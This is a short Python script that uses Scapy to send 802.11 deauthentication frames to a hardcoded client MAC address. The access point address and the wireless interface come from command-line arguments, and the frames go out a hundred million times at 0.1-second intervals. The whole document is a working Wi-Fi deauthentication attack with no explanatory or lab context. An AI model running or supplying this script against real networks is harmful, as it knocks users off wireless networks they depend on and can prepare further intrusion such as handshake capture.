import sys
from scapy.all import *

mac="18:56:80:00:A4:2E"

packet=RadioTap()/Dot11(addr1=mac,addr2=sys.argv[2],addr3=sys.argv[2])/Dot11Deauth()

sendp(packet,iface=sys.argv[1],count=100000000,inter=0.1)
